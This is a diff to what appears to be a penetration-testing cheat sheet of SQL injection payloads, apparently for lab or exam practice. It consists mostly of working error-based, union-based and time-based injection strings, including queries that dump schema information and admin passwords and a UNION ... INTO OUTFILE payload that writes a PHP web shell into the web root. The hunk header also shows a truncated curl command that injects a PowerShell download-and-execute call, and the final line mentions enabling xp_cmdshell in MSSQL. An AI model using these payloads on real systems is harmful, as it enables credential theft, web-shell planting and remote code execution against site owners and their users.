@@ -129,12 +129,17 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 | `' AND IF (1=1, sleep(3),'false') -- //` | **Time-based** SQLi. IF condition will always be true inside the statement itself, so it will return false if the user is non-existent |
 | **Error-based payloads** | **Description** |
 | `' or 1=1 in (select @@version) -- //` | If it returns the version, querying the database interactively is possible, so we can run queries like this. If we receive an error specifying the number of columns we can filter the query to return just one column |
-| `' or 1=1 in (SELECT password FROM users) -- //` | Example query |
+| `' or 1=1 in (select table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema=database()) -- //` | Query db info |
+| `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //` | Example query |
 | **Union-based payloads** | **Description** |
 | `' ORDER BY 1-- //` | To discover the number of columns. It will order the results by a specific column, meaning it will fail whenever the selected column does not exist |
-| `' UNION SELECT table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema=database()  -- //` | Query tables info for current dabatase |
+| `%' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database()  -- //` | Query db info |
+| `%' UNION SELECT null, password, null FROM users  -- //` | Example query |
+| `%' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //` | Write a shell in root folder |
 | **Blind payloads** | **Description** |
 | `' AND IF (1=1, sleep(3),'false') -- //` | **Time-based** SQLi. IF condition will always be true inside the statement itself, so it will return false if the user is non-existent |
+| `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //` | Write a shell in root folder |
+
 
 Enable code execution in MSSQL (`xp_cmdshell`):
 
